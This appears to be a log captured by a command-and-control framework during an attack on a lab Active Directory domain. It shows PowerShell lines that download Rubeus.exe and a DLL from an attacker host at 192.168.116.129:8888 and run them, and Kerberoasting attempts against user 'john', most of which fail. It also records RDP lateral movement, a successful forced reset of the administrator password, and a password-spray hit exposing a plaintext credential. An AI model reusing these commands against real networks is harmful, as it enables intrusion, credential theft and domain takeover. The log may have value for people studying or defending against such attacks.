@@ -1,0 +1,275 @@
+.
+C2nan:#/
+===============TGStickets=============== Exception calling "DownloadFile" with "2" argument(s): "An exception occurred during a WebClient request."
+At line:1 char:61
++ ... ===========;(New-Object Net.WebClient).DownloadFile('http://192.168.1 ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+ 
+rubeus.exe : The term 'rubeus.exe' is not recognized as the name of a cmdlet, function, script file, or operable 
+At line:2 char:43
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
++ ubeus.exe');cd $env:userprofile\documents;rubeus.exe kerberoast /user ...
++                                           ~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException.
+C2nan:#/
+===============TGStickets=============== Exception calling "DownloadFile" with "2" argument(s): "An exception occurred during a WebClient request."
+At line:1 char:61
++ ... ===========;(New-Object Net.WebClient).DownloadFile('http://192.168.1 ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+ 
+rubeus.exe : The term 'rubeus.exe' is not recognized as the name of a cmdlet, function, script file, or operable 
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:2 char:43
++ ubeus.exe');cd $env:userprofile\documents;rubeus.exe kerberoast /user ...
++                                           ~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException.
+C2nan:#/
+===============TGStickets=============== Exception calling "DownloadFile" with "2" argument(s): "An exception occurred during a WebClient request."
+At line:1 char:61
++ ... ===========;(New-Object Net.WebClient).DownloadFile('http://192.168.1 ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+ 
+rubeus.exe : The term 'rubeus.exe' is not recognized as the name of a cmdlet, function, script file, or operable 
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:2 char:43
++ ubeus.exe');cd $env:userprofile\documents;rubeus.exe kerberoast /user ...
++                                           ~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException At line:1 char:160
++ ... e('http://192.168.116.129:8888/Rubeus.exe', $env:userprofile+\Documen ...
++                                                                  ~
+You must provide a value expression following the '+' operator.
+At line:1 char:160
++ ... e('http://192.168.116.129:8888/Rubeus.exe', $env:userprofile+\Documen ...
++                                                                  ~
+Missing ')' in method call.
+At line:1 char:160
++ ... .129:8888/Rubeus.exe', $env:userprofile+\Documents/rubeus.exe);cd $en ...
++                                             ~~~~~~~~~~~~~~~~~~~~~
+Unexpected token '\Documents/rubeus.exe' in expression or statement.
+At line:1 char:181
++ ... 129:8888/Rubeus.exe', $env:userprofile+\Documents/rubeus.exe);cd $env ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ExpectedValueExpression At line:1 char:159
++ ... le('http://192.168.116.129:8888/Rubeus.exe',$env:USERPROFILE+/Documen ...
++                                                                  ~
+You must provide a value expression following the '+' operator.
+At line:1 char:160
++ ... e('http://192.168.116.129:8888/Rubeus.exe',$env:USERPROFILE+/Document ...
++                                                                  ~
+You must provide a value expression following the '/' operator.
+At line:1 char:160
++ ... e('http://192.168.116.129:8888/Rubeus.exe',$env:USERPROFILE+/Document ...
++                                                                  ~
+Missing ')' in method call.
+At line:1 char:160
++ ... 6.129:8888/Rubeus.exe',$env:USERPROFILE+/Documents/rubeus.exe);cd $en ...
++                                              ~~~~~~~~~~~~~~~~~~~~
+Unexpected token 'Documents/rubeus.exe' in expression or statement.
+At line:1 char:180
++ ... .129:8888/Rubeus.exe',$env:USERPROFILE+/Documents/rubeus.exe);cd $env ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ExpectedValueExpression.
+C2nan:#/
+===============TGStickets=============== rubeus.exe : The term 'rubeus.exe' is not recognized as the name of a cmdlet, function, script file, or operable 
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:214
++ ... cuments/rubeus.exe');cd $env:userprofile\documents;rubeus.exe kerbero ...
++                                                        ~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException.
+C2nan:#/
+===============TGStickets=============== rubeus.exe : The term 'rubeus.exe' is not recognized as the name of a cmdlet, function, script file, or operable 
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:214
++ ... cuments/rubeus.exe');cd $env:userprofile\documents;rubeus.exe kerbero ...
++                                                        ~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException At line:1 char:214
++ ... :USERPROFILE+'/Documents/rubeus.exe');cd $env:userprofile\documents;.
++                                                                         ~
+Missing expression after '.' in pipeline element.
+At line:1 char:215
++ ... :USERPROFILE+'/Documents/rubeus.exe');cd $env:userprofile\documents;.
++                                                                          ~
+Unexpected token '
+' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingExpression At line:1 char:214
++ ... :USERPROFILE+'/Documents/rubeus.exe');cd $env:userprofile\documents;.
++                                                                         ~
+Missing expression after '.' in pipeline element.
+At line:1 char:215
++ ... :USERPROFILE+'/Documents/rubeus.exe');cd $env:userprofile\documents;.
++                                                                          ~
+Unexpected token '
+' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingExpression At line:1 char:214
++ ... :USERPROFILE+'/Documents/rubeus.exe');cd $env:userprofile\documents;.
++                                                                         ~
+Missing expression after '.' in pipeline element.
+At line:1 char:215
++ ... :USERPROFILE+'/Documents/rubeus.exe');cd $env:userprofile\documents;.
++                                                                          ~
+Unexpected token '
+' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingExpression.
+C2nan:#/
+===============TGStickets=============== Program 'rubeus.exe' failed to run: Operation did not complete successfully because the file contains a virus or 
+potentially unwanted softwareAt line:1 char:214
++ ... rofile\documents;./rubeus.exe kerberoast /user:john /nowrap /tgtdeleg
++                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
+At line:1 char:214
++ ... rofile\documents;./rubeus.exe kerberoast /user:john /nowrap /tgtdeleg
++                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed.
+C2nan:#/
+===============TGStickets===============
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+  v2.2.0 
+[*] Action: Kerberoasting
+[*] Using 'tgtdeleg' to request a TGT for the current user
+[X] Error: AcquireCredentialsHandle error: -2146893042
+[!] Unhandled Rubeus exception:
+System.NullReferenceException: Object reference not set to an instance of an object.
+   at Rubeus.KRB_CRED..ctor(Byte[] bytes)
+   at Rubeus.Roast.Kerberoast(String spn, List`1 spns, String userName, String OUName, String domain, String dc, NetworkCredential cred, String outFile, Boolean simpleOutput, KRB_CRED TGT, Boolean useTGTdeleg, String supportedEType, String pwdSetAfter, String pwdSetBefore, String ldapFilter, Int32 resultLimit, Int32 delay, Int32 jitter, Boolean userStats, Boolean enterprise, Boolean autoenterprise, Boolean ldaps, String nopreauth)
+   at Rubeus.Commands.Kerberoast.Execute(Dictionary`2 arguments)
+   at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
+   at Rubeus.Program.MainExecute(String commandName, Dictionary`2 parsedArgs) .
+C2nan:#/
+===============TGStickets===============
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+  v2.2.0 
+[*] Action: Kerberoasting
+[*] Using 'tgtdeleg' to request a TGT for the current user
+[X] Error: AcquireCredentialsHandle error: -2146893042
+[!] Unhandled Rubeus exception:
+System.NullReferenceException: Object reference not set to an instance of an object.
+   at Rubeus.KRB_CRED..ctor(Byte[] bytes)
+   at Rubeus.Roast.Kerberoast(String spn, List`1 spns, String userName, String OUName, String domain, String dc, NetworkCredential cred, String outFile, Boolean simpleOutput, KRB_CRED TGT, Boolean useTGTdeleg, String supportedEType, String pwdSetAfter, String pwdSetBefore, String ldapFilter, Int32 resultLimit, Int32 delay, Int32 jitter, Boolean userStats, Boolean enterprise, Boolean autoenterprise, Boolean ldaps, String nopreauth)
+   at Rubeus.Commands.Kerberoast.Execute(Dictionary`2 arguments)
+   at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
+   at Rubeus.Program.MainExecute(String commandName, Dictionary`2 parsedArgs) .
+C2nan:#/
+===============TGStickets===============
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+  v2.2.0 
+[*] Action: Kerberoasting
+[*] Target User            : john
+[*] Target Domain          : Normal.users
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*] Searching path 'LDAP://LAB-DC-01.Normal.users/DC=Normal,DC=users' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=john)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+[X] Error executing the domain searcher: An operations error occurred.
+[X] LDAP query failed, try specifying more domain information or specific SPNs. .
+C2nan:#/
+===============TGStickets===============
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+  v2.2.0 
+[*] Action: Kerberoasting
+[*] Listing statistics about target users, no ticket requests being performed.
+[*] Target Domain          : Normal.users
+[*] Searching path 'LDAP://LAB-DC-01.Normal.users/DC=Normal,DC=users' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+[X] Error executing the domain searcher: An operations error occurred.
+[X] LDAP query failed, try specifying more domain information or specific SPNs. 
+
+ C2nan:#/
+===============Lateral Movement via RDP===============
+[02:14:13:411] [335306:335307] [ERROR][com.freerdp.core] - rdp_set_error_info:freerdp_set_last_error_ex ERRINFO_LOGOFF_BY_USER [0x0001000C]
+
+
+ C2nan:#/
+===============Lateral Movement via RDP===============
+[02:14:32:132] [335460:335460] [ERROR][com.freerdp.core] - freerdp_abort_connect:freerdp_set_last_error_ex ERRCONNECT_CONNECT_CANCELLED [0x0002000B]
+
+
+ C2nan:#/
+===============Lateral Movement via RDP===============
+[02:19:19:013] [335872:335937] [WARN][com.freerdp.client.x11] - failed to get clipboard data in format UTF8_STRING [source format CF_UNICODETEXT]
+.
+C2nan:#/
+===============Force
+Change
+Password===============
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'administrator'
+VERBOSE: [Set-DomainUserPassword] Password for user 'administrator' successfully reset [02:33:58:023] [335872:335873] [ERROR][com.freerdp.core] - rdp_set_error_info:freerdp_set_last_error_ex ERRINFO_DISCONNECTED_BY_OTHER_CONNECTION [0x00010005]
+.
+C2nan:#/
+===============Get-ADDomain=============== Exception calling "DownloadFile" with "2" argument(s): "An exception occurred during a WebClient request."
+At line:1 char:1
++ (New-Object Net.WebClient).DownloadFile('http://192.168.116.129:8888/ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+ 
+import-module : The specified module 'c:/users/hasan/MAMAD.dll' was not loaded because no valid module file was found 
+in any module directory.
+At line:1 char:110
++ ... sers/hasan/MAMAD.dll');import-module c:/users/hasan/MAMAD.dll;echo .  ...
++                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (c:/users/hasan/MAMAD.dll:String) [Import-Module], FileNotFoundExce 
+   ption
+    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand
+ 
+Get-ADDomain : The term 'Get-ADDomain' is not recognized as the name of a cmdlet, function, script file, or operable 
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:211
++ ... #/`r`n===============Get-ADDomain===============;Get-ADDomain;echo  ` ...
++                                                      ~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Get-ADDomain:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+ C2nan:#/
+===============Lateral Movement via RDP===============
+[14:03:23:274] [32097:32106] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer
+[14:03:23:274] [32097:32106] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
+[14:03:24:600] [32097:32106] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer
+[14:03:24:600] [32097:32106] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
+[14:03:24:601] [32097:32106] [ERROR][com.freerdp.core] - freerdp_post_connect failed
+
+
+ C2nan:#/
+===============kerbrute O/P===============
+OutPut in the following path:
+/root/Desktop/c2Https-motest/blog/Modules/ActiveDirectory/../../data/listeners/agents/JXTIEW/
+
+ C2nan:#/
+===============Password Spraying===============
+SMB         192.168.116.184 445    LAB-DC-01        [+] Normal.users\ahmed:P@ssw0rd 
